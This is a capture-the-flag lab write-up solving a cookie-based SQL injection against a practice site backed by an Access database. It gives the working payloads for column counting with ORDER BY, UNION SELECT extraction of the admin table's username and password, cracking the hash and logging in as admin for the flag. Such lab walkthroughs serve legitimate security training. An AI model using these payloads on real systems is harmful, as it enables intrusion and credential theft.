# Lab 1 Access Cookie Injection

## 0x00 Lab Site

Lab site from [zkaq.org][1]

## 0x01 Go Hack It

### [Main Page][4]

![](./imgs/0_index.jpg)

### News

It also has a news page with parameter **id**=171

![](./imgs/1_news.jpg)

### Get Inject Point

Tried with 1=1, shows with WAF.

```sql
?id=171 AND 1=1
```

![](./imgs/2_waf.jpg)

But it still works with **ORDER BY**

```sql
?id=171 ORDER BY 10
```

![](./imgs/3_order.jpg)

10 works but 11 causes error. So we need to select 10 fields.

![](./imgs/3_order_err.jpg)

### Modheader

Clear url parameters and add id=171 into Cookie using [ModHeader][2]. Refresh page, still has the same news data.

![](./imgs/3_modheader.png)

### Get Output Location

```sql
id=171+UNION+SELECT+1,2,3,4,5,6,7,8,9,10+FROM+admin
```

![](./imgs/4_select.jpg)

**Note**: It has to need a table name here to make it work for ACCESS DB. That is what we can GUESS at the moment. Will need some tools or other method to make it work. Some of the common used table name including **user, news, admin, system**.

Also need to use + to replace SPACE to make it still valid.

![](./imgs/4_select_result.jpg)

So we have **2, 3, 7, 8, 9** as output locations.

### Dump Data

```sql
id=171+UNION+SELECT+1,username,password,4,5,6,7,8,9,10+FROM+admin
```

![](./imgs/5_dump_pwd.jpg)

Also need to GUESS field names here to dump out results. May need some better methods. (TODO)

![](./imgs/5_dump_result.jpg)

The **USERNAME** is **admin** and **PWD** is **b9a2a2b5dffb918c**.

### CMD5

However the password looks like an encoded version. Try decoding with [CMD5][3].

![](./imgs/6_cmd5.jpg)

Get the result **welcome**.

### Login as Admin

Go to http://host/admin and login. Pleas note to disable modified Cookie when login.

![](./imgs/7_admin_login.jpg)

Successfully get the **FLAG** = **zkz{welcome-control}**

![](./imgs/8_flag.jpg)


[1]: https://hack.zkaq.org/?a=battle&f=target&id=bd45ae05e752d860
[2]: https://mod-header.appspot.com/
[3]: https://www.cmd5.org/
[4]: http://120.203.13.75:8001/